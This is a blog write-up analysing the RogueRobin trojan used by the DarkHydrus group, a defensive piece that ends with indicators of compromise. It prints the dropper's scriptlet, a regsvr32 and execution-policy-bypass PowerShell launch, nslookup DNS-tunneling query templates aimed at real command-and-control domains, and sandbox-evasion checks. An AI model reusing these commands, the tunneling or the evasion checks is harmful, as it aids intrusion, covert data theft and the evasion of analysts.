<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Deep Analysis of RogueRobin Trojan (DarkHydrus APT) - Zakariae el bouzarazi</title>
<meta name="description" content="The first stage of this malware is an excel document with a macro, it asks to click Enable Content to run the macro, the document doesn’t contain any data (not so convincing). To view the macro, from the Developer…. ">


  <meta name="author" content="Zakariae El bouzarazi">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Zakariae el bouzarazi">
<meta property="og:title" content="Deep Analysis of RogueRobin Trojan (DarkHydrus APT)">
<meta property="og:url" content="http://localhost:4000/malware%20analysis/roguerobin-trojan/">


  <meta property="og:description" content="The first stage of this malware is an excel document with a macro, it asks to click Enable Content to run the macro, the document doesn’t contain any data (not so convincing). To view the macro, from the Developer…. ">



  <meta property="og:image" content="http://localhost:4000/assets/images/malware-analysis/roguerobin-trojan/2.png">





  <meta property="article:published_time" content="2020-03-29T00:00:00+00:00">





  

  


<link rel="canonical" href="http://localhost:4000/malware%20analysis/roguerobin-trojan/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "zakariae Elbouzarazi",
      "url": "http://localhost:4000/"
    
  }
</script>


  <meta name="google-site-verification" content="J3MnMF94zaZhTUoNtUiRt9cKsr7hiMyTxEdAvQ3GfmY" />





<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Zakariae el bouzarazi Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/site_data/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/site_data/favicon-16x16.png">
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/site_data/logo.png" alt=""></a>
        
        <a class="site-title" href="/">
          Zakariae el bouzarazi
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/categories/#malware-analysis">Malware Analysis</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#binary-exploitation">Binary Exploitation</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#ctf-writeups">CTF Writeups</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#tutorials">Tutorials</a>
            </li><li class="masthead__menu-item">
              <a href="/categories">All Categories</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/site_data/avatar.jpg" alt="Zakariae El bouzarazi" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Zakariae El bouzarazi</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Malware Analysis &amp; Reverse Engineering Adventures.</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      
        
          
            <li><a href="zekuelbouzrazi@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
          
        
          
            <li><a href="https://twitter.com/_n1ghtw0lf" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://www.linkedin.com/in/zakariae-elbouzarazi-34126b293/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
          
        
          
            <li><a href="https://github.com/elbouzarazi" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->

    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Deep Analysis of RogueRobin Trojan (DarkHydrus APT)">
    <meta itemprop="description" content="First Stage: Excel document [Dropper]">
    <meta itemprop="datePublished" content="2020-03-29T00:00:00+00:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Deep Analysis of RogueRobin Trojan (DarkHydrus APT)
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  8 minute read

</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#first-stage-excel-document-dropper">First Stage: Excel document [Dropper]</a></li>
  <li><a href="#second-stage-net-executable">Second Stage: .NET Executable</a>
    <ul>
      <li><a href="#sandbox-evasion">Sandbox Evasion</a></li>
      <li><a href="#persistence">Persistence</a></li>
      <li><a href="#c2-communications">C2 Communications</a></li>
      <li><a href="#receiving-commands">Receiving Commands</a></li>
      <li><a href="#google-drive-as-alternative-c2-x_mode">Google Drive As Alternative C2 (x_mode)</a></li>
      <li><a href="#iocs">IOCs</a></li>
      <li><a href="#external-references">External References</a></li>
    </ul>
  </li>
</ul>

            </nav>
          </aside>
        
        <h1 id="first-stage-excel-document-dropper"><u>First Stage: Excel document [Dropper]</u></h1>

<p><code class="language-plaintext highlighter-rouge">MD5: 8DC9F5450402AE799F5F8AFD5C0A8352</code></p>

<p>The first stage of this malware is an excel document with a <code class="language-plaintext highlighter-rouge">macro</code>, it asks to click <code class="language-plaintext highlighter-rouge">Enable Content</code> to run the macro, the document doesn’t contain any data (not so convincing).</p>

<p><a href="/assets/images/malware-analysis/roguerobin-trojan/1.png"><img src="/assets/images/malware-analysis/roguerobin-trojan/1.png" alt="1" /></a></p>

<p>To view the macro, from the Developer tab <strong>(File –&gt; Options –&gt; Customize Ribbon –&gt; Developer Checkbox)</strong>, click Visual Basic and you can see the macro.</p>

<p>The macro first writes a long powershell script to <code class="language-plaintext highlighter-rouge">%TEMP%\WINDOWSTEMP.ps1</code>, Then it writes an SCT script to <code class="language-plaintext highlighter-rouge">%TEMP%\12-B-366.txt</code>.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;?</span><span class="no">XML</span> <span class="n">version</span><span class="o">=</span><span class="s">"1.0"</span><span class="o">?&gt;</span>
<span class="o">&lt;</span><span class="n">scriptlet</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">registration</span> <span class="n">progid</span> <span class="o">=</span> <span class="s">"PoC"</span> <span class="n">classid</span><span class="o">=</span><span class="s">"{F0001111-0000-0000-0000-0000FEEDACDC}"</span> <span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">script</span> <span class="n">language</span><span class="o">=</span><span class="s">"JScript"</span><span class="o">&gt;</span>
            <span class="o">&lt;![</span><span class="no">CDATA</span><span class="o">[</span> <span class="kt">var</span> <span class="n">r</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ActiveXObject</span><span class="o">(</span><span class="s">"WScript.Shell"</span><span class="o">).</span><span class="na">Run</span><span class="o">(</span><span class="s">""</span> <span class="o">+</span> <span class="n">powershell_command</span> <span class="o">+</span> <span class="s">""</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span> <span class="o">]]&gt;</span>
        <span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
    <span class="o">&lt;/</span><span class="n">registration</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="n">scriptlet</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>Finally it runs this SCT script with the command:</p>

<p><code class="language-plaintext highlighter-rouge">regsvr32.exe /s /n /u /i: %TEMP%\12-B-366.txt scrobj.dll</code></p>

<p>The SCT script will run a powershell command which executes the powershell script that was written to the temp folder:</p>

<p><code class="language-plaintext highlighter-rouge">powershell.exe -noexit -exec bypass -File %TEMP%\WINDOWSTEMP.ps1</code></p>

<p>The powershell script contains a large base64 string which is decoded and Gzip decompressed then it’s written to <code class="language-plaintext highlighter-rouge">%APPDATA%\Microsoft\Windows\Templates\WindowsTemplate.exe</code> and gets executed.</p>

<p>At last it creates a shortcut to this executable at the startup folder under the name <code class="language-plaintext highlighter-rouge">%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneDrive.lnk</code>(one way to achieve persistence but very easily detectable).</p>

<p>So the chain works as follows:</p>

<p><strong>SCT script</strong>   <em>–<u>run</u>–&gt;</em>   <strong>Powershell script</strong>   <em>–<u>drop</u>–&gt;</em>   <strong>Final executable</strong></p>

<h1 id="second-stage-net-executable"><u>Second Stage: .NET Executable</u></h1>

<p><code class="language-plaintext highlighter-rouge">MD5: 039BD47F0FDB6BB7D68A2428C71F317D</code></p>

<p>The malware code is not obfuscated which is very helpful.</p>

<p>First the malware checks <code class="language-plaintext highlighter-rouge">sandboxEvision_controler</code> variable and if it’s true (which is not in this sample), it tries some sandbox evasion techniques then it goes to the main functionality.</p>

<p><a href="/assets/images/malware-analysis/roguerobin-trojan/2.png"><img src="/assets/images/malware-analysis/roguerobin-trojan/2.png" alt="2" /></a></p>

<h2 id="sandbox-evasion">Sandbox Evasion</h2>

<ul>
  <li>
    <p>check if windows BIOS version <code class="language-plaintext highlighter-rouge">SMBIOSBIOSVERSION</code> contains any of these strings:</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>VBOX
bochs
qemu
VirtualBox
VM
</code></pre></div>    </div>
  </li>
  <li>
    <p>check if <code class="language-plaintext highlighter-rouge">win32_computersystem</code> matches <code class="language-plaintext highlighter-rouge">VMware</code></p>
  </li>
  <li>
    <p>check if <code class="language-plaintext highlighter-rouge">TotalPhysicalMemory &lt; 2900000000 bytes</code></p>
  </li>
  <li>
    <p>check if <code class="language-plaintext highlighter-rouge">NumberOfProcessorCores &lt; 1</code></p>
  </li>
  <li>
    <p>check if any <code class="language-plaintext highlighter-rouge">Wireshark</code> or <code class="language-plaintext highlighter-rouge">Sysinternals</code> process is running</p>
  </li>
  <li>
    <p>check if there is any attached debugger</p>
  </li>
</ul>

<p>If any one of these conditions is true, the malware will exit.</p>

<table>
  <tbody>
    <tr>
      <td><a href="/assets/images/malware-analysis/roguerobin-trojan/3.png"><img src="/assets/images/malware-analysis/roguerobin-trojan/3.png" alt="3" /></a></td>
      <td><a href="/assets/images/malware-analysis/roguerobin-trojan/4.png"><img src="/assets/images/malware-analysis/roguerobin-trojan/4.png" alt="4" /></a></td>
    </tr>
  </tbody>
</table>

<h2 id="persistence">Persistence</h2>

<p>After the sandbox evasion, the malware checks <code class="language-plaintext highlighter-rouge">hasStartup</code> variable and if it’s true (which is not in this sample), it copies it self to <code class="language-plaintext highlighter-rouge">%APPDATA%\OneDrive.exe</code> and creates a shortcut at the startup folder under the name <code class="language-plaintext highlighter-rouge">OneDrive.lnk</code>.</p>

<p>This step was already done by the powershell script which explains why the <code class="language-plaintext highlighter-rouge">hasStartup</code> variable is set to false.</p>

<p><a href="/assets/images/malware-analysis/roguerobin-trojan/5.png"><img src="/assets/images/malware-analysis/roguerobin-trojan/5.png" alt="5" /></a></p>

<h2 id="c2-communications">C2 Communications</h2>

<p>This malware uses a technique called <code class="language-plaintext highlighter-rouge">DNS Tunneling</code> which leverages the DNS requests to send and receive data (usually DNS requests are not filtered by the firewall which makes this technique very powerful).</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C2 Domains:
    0ffice365.agency
    0nedrive.agency
    corewindows.agency
    microsoftonline.agency
    onedrive.agency
    sharepoint.agency
    skydrive.agency
    0ffice365.life
    0ffice365.services
    skydrive.services
</code></pre></div></div>

<p>The malware first flushes the DNS cache with the command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ipconfig /flushdns
</code></pre></div></div>

<p>Then it loops through the C2 domains and send a DNS query to each one of them, it has three variants or modes:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>normal request:       nslookup.exe -q={DNS_quest_type} {id}.{domain_name}
ac mode is enables:   nslookup.exe -timeout=5 -q={DNS_quest_type} {id}.ac.{domain_name}
debugger is attached: nslookup.exe -timeout=5 -q={DNS_quest_type} 676f6f646c75636b.ac.{domain_name}
</code></pre></div></div>

<p>Interestingly enough, if we decode <code class="language-plaintext highlighter-rouge">676f6f646c75636b</code> (the value added if a debugger is attached), we get the value <code class="language-plaintext highlighter-rouge">goodluck</code>, the malware author is trying to be funny with the analyst :)</p>

<p>Here is the possible DNS query types used by the malware:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DNS query types:
    MX
    TXT
    A
    AAAA
</code></pre></div></div>

<p>The request <code class="language-plaintext highlighter-rouge">id</code> is generated by calling <code class="language-plaintext highlighter-rouge">GetCurrentProcess()</code> then transforming the process id to a string with these replacements:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0 --&gt; h
1 --&gt; i
2 --&gt; j
3 --&gt; k
4 --&gt; l
5 --&gt; m
6 --&gt; n
7 --&gt; o
8 --&gt; p
9 --&gt; q
</code></pre></div></div>

<p>In this case, the process id was <code class="language-plaintext highlighter-rouge">3206</code> which translates to <code class="language-plaintext highlighter-rouge">kjnh</code>, the id is prefixed with the <code class="language-plaintext highlighter-rouge">request_type</code> which is either <code class="language-plaintext highlighter-rouge">a,b,c or d</code> and the <code class="language-plaintext highlighter-rouge">comm_model</code> is appended to the end of the id which is just the letter ‘c’.</p>

<p>Example of the connections:</p>

<p><a href="/assets/images/malware-analysis/roguerobin-trojan/6.png"><img src="/assets/images/malware-analysis/roguerobin-trojan/6.png" alt="6" /></a></p>

<ul>
  <li>If the response contains any of these strings, the query function returns “cancel”:</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>216.58.192.174
2a00:1450:4001:81a::200e
2200::
download.microsoft.com
ntservicepack.microsoft.com
windowsupdate.microsoft.com
update.microsoft.com
</code></pre></div></div>

<ul>
  <li>If the response contains any of these strings, the query function moves to the next domain:</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>timeout
UnKnown can
Unspecified error
</code></pre></div></div>

<ul>
  <li>If the response contains any of these strings, the query function returns the DNS response and exits:</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>canonical name
mx
namerserver
mail serve
address
</code></pre></div></div>

<p>After getting the response, the malware passes it to <code class="language-plaintext highlighter-rouge">magic()</code> function which takes two parameters: the DNS response and a state, the state can be one of these strings:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getjob
havejob
getid
</code></pre></div></div>

<p>At this stage, the malware passes <code class="language-plaintext highlighter-rouge">getid</code> to get a unique id of length 2, if the response wasn’t valid, the returned id is set to “0”.</p>

<p>After looping through all the domains, the malware checks if the id has a length of 2 (which indicates that it successfully connected to one of the C2 domains), if not, the malware loops through the C2 domains again but with the <code class="language-plaintext highlighter-rouge">waiting</code> value doubled. The initial waiting value is <strong>120 ms</strong> and the maximum allowed value is <strong>7200 ms</strong> (which means that it can loop <strong>6</strong> time only).</p>

<p>In case of a successful connection, the malware sends the computer info along with the connections results to the C2 server, computer info includes: internal network IP, host name, domain name, username, if the current user is admin, and some of the malware configuration variables. It should look like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.0.2.15|IEuser-PC|WORKGROUP|IEuser|01|0|0|1|1|0|cs
</code></pre></div></div>

<p>Here we can see the use of DNS Tunneling to send the data to the C2 server in <code class="language-plaintext highlighter-rouge">spliting()</code> function which is responsible for sending data, first it determines the chunk size by getting a random value between <strong>[min_query_size, max_query_size]</strong> which in in this sample is <strong>[30, 32]</strong> then it sends it in the DNS request in the form <code class="language-plaintext highlighter-rouge">data.domain</code>.</p>

<p>Note that the max length for a subdomain cannot be longer than <strong>63</strong> characters, that’s why the data is split into chunks.</p>

<p><a href="/assets/images/malware-analysis/roguerobin-trojan/7.png"><img src="/assets/images/malware-analysis/roguerobin-trojan/7.png" alt="7" /></a></p>

<h2 id="receiving-commands">Receiving Commands</h2>

<p>The malware queries the C2 server every second, it extracts commands using these regular expressions:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Address:\\s+(([a-fA-F0-9]{0,4}:{1,2}){1,8})
Address:\\s+\\d+.\\d+.\\d+.\\d+
Address:\\s+40.112.(\\d+.\\d+)
\\s(\\w{3}).(domain_1|domain_2|...|domain_n)
</code></pre></div></div>

<p>If the malware receives a new command, it will start a new thread to execute it:</p>

<p><a href="/assets/images/malware-analysis/roguerobin-trojan/8.png"><img src="/assets/images/malware-analysis/roguerobin-trojan/8.png" alt="8" /></a></p>

<p>Here is the list of commands:</p>

<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>kill {thread_name}</td>
      <td>kill a specific malware thread</td>
    </tr>
    <tr>
      <td>fileDownload {file_path}</td>
      <td>download a file from the victim’s machine</td>
    </tr>
    <tr>
      <td>fileUpload {file_path}</td>
      <td>upload a file to the victim’s machine</td>
    </tr>
    <tr>
      <td>importModule {powershell_command}</td>
      <td>run a powershell command then add it to “modules” list</td>
    </tr>
    <tr>
      <td>ClearModules</td>
      <td>clear “modules” list</td>
    </tr>
    <tr>
      <td>x_mode {OFF | x_mode values}</td>
      <td>disable or enable x_mode (Google Drive mode)</td>
    </tr>
    <tr>
      <td>testmode</td>
      <td>test connection to C2 domains</td>
    </tr>
    <tr>
      <td>showconfig</td>
      <td>return config variables including the C2 domains and DNS query types</td>
    </tr>
    <tr>
      <td>changeConfig</td>
      <td>change config variables</td>
    </tr>
    <tr>
      <td>slp</td>
      <td>change sleep and jitter values</td>
    </tr>
    <tr>
      <td>exit</td>
      <td>exit the malware process</td>
    </tr>
  </tbody>
</table>

<h2 id="google-drive-as-alternative-c2-x_mode">Google Drive As Alternative C2 (x_mode)</h2>

<p>This malware have a mode called <code class="language-plaintext highlighter-rouge">x_mode</code> which makes it use Google Drive as a C2 server, this mode is disabled by default and can be enabled by receiving a command from one of the C2 DNS servers.</p>

<p><a href="/assets/images/malware-analysis/roguerobin-trojan/9.png"><img src="/assets/images/malware-analysis/roguerobin-trojan/9.png" alt="9" /></a></p>

<p>We can see some configuration variables for this x_mode, let’s go though them one by one:</p>

<h4 id="gdu">gdu:</h4>

<p>This is the Google Drive URL used for downloading data.</p>

<p><a href="/assets/images/malware-analysis/roguerobin-trojan/10.png"><img src="/assets/images/malware-analysis/roguerobin-trojan/10.png" alt="10" /></a></p>

<h4 id="gduu">gduu:</h4>

<p>This is the Google Drive URL used for uploading data, you can see <code class="language-plaintext highlighter-rouge">UploadData()</code> called twice. The first time to create a new file with <code class="language-plaintext highlighter-rouge">file_name</code>, the second time is to upload the file <code class="language-plaintext highlighter-rouge">content</code> to the newly created file.</p>

<p><a href="/assets/images/malware-analysis/roguerobin-trojan/11.png"><img src="/assets/images/malware-analysis/roguerobin-trojan/11.png" alt="11" /></a></p>

<h4 id="gdo2t">gdo2t:</h4>

<p>This is the Google Drive URL that is used to obtain OAUTH 2 access token. this is necessary to authorize requests to the Google Drive API.</p>

<h4 id="client_id-cs-r_t">client_id, cs, r_t:</h4>

<p>Client ID, Client Secret and Refresh Token. These three variables are used in the request to the access token.</p>

<p><a href="/assets/images/malware-analysis/roguerobin-trojan/12.png"><img src="/assets/images/malware-analysis/roguerobin-trojan/12.png" alt="12" /></a></p>

<p>Now that we know the usage of each configuration variable, let’s dig into the process of communicating and receiving commands from Google Drive.</p>

<table>
  <tbody>
    <tr>
      <td><a href="/assets/images/malware-analysis/roguerobin-trojan/13.png"><img src="/assets/images/malware-analysis/roguerobin-trojan/13.png" alt="13" /></a></td>
      <td><a href="/assets/images/malware-analysis/roguerobin-trojan/14.png"><img src="/assets/images/malware-analysis/roguerobin-trojan/14.png" alt="14" /></a></td>
    </tr>
  </tbody>
</table>

<p>The first thing the malware does is to get an API access token, then it checks <code class="language-plaintext highlighter-rouge">f_id</code> and if it’s empty, it uploads a file with the name <code class="language-plaintext highlighter-rouge">{process_id}.txt</code> and its contents is <code class="language-plaintext highlighter-rouge">the encoded process_id . current_C2_domain</code>.</p>

<p>After that it stores this file’s <code class="language-plaintext highlighter-rouge">modification_time</code> and uploads another file with the name <code class="language-plaintext highlighter-rouge">{process_id}-U.txt</code> and its content is <code class="language-plaintext highlighter-rouge">process_id</code>.</p>

<p>If any of these operations returned an error instead of a valid file id, the malware deletes these two files and loops again to repeat the process.</p>

<table>
  <tbody>
    <tr>
      <td><a href="/assets/images/malware-analysis/roguerobin-trojan/15.png"><img src="/assets/images/malware-analysis/roguerobin-trojan/15.png" alt="15" /></a></td>
      <td><a href="/assets/images/malware-analysis/roguerobin-trojan/16.png"><img src="/assets/images/malware-analysis/roguerobin-trojan/16.png" alt="16" /></a></td>
    </tr>
  </tbody>
</table>

<p>The last step is that the malware compares the file <code class="language-plaintext highlighter-rouge">{process_id}.txt</code> modification time with the stored modification time and if it’s not the same, it downloads the new file content (the new attacker commands) and updates the modification time. Then it goes though the same parsing and command extraction techniques used with the DNS Tunneling.</p>

<p>And that wrap up this analysis.</p>

<h2 id="iocs">IOCs</h2>

<h3 id="hashes"><u>Hashes</u></h3>

<p>First stage: 8DC9F5450402AE799F5F8AFD5C0A8352</p>

<p>Second stage: 039BD47F0FDB6BB7D68A2428C71F317D</p>

<h3 id="files"><u>Files</u></h3>

<p>%TEMP%\WINDOWSTEMP.ps1</p>

<p>%TEMP%\12-B-366.txt</p>

<p>%APPDATA%\Microsoft\Windows\Templates\WindowsTemplate.exe</p>

<p>%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneDrive.lnk</p>

<h3 id="c2-domains"><u>C2 Domains</u></h3>

<p>0ffice365[.]agency</p>

<p>0nedrive[.]agency</p>

<p>corewindows[.]agency</p>

<p>microsoftonline[.]agency</p>

<p>onedrive[.]agency</p>

<p>sharepoint[.]agency</p>

<p>skydrive[.]agency</p>

<p>0ffice365[.]life</p>

<p>0ffice365[.]services</p>

<p>skydrive[.]services</p>

<h2 id="external-references">External References</h2>

<p><a href="https://www.paloaltonetworks.com/cyberpedia/what-is-dns-tunneling">https://www.paloaltonetworks.com/cyberpedia/what-is-dns-tunneling</a></p>

<p><a href="https://blog.centurylink.com/ismdoor-malware-continues-to-make-use-of-dns-tunneling/">https://blog.centurylink.com/ismdoor-malware-continues-to-make-use-of-dns-tunneling</a></p>

        
      </section>

      <footer class="page__meta">
        
        


  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#malware-analysis" class="page__taxonomy-item" rel="tag">Malware Analysis</a>
    
    </span>
  </p>




        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-03-29T00:00:00+00:00">March 29, 2020</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/binary%20exploitation/random/" class="pagination--pager" title="Pwnable.kr - random
">Previous</a>
    
    
      <a href="/binary%20exploitation/input/" class="pagination--pager" title="Pwnable.kr - input
">Next</a>
    
  </nav>


    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->

        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
      
        
      
        
      
        
      
    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2024 zakariae Elbouzarazi. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>










  </body>
</html>
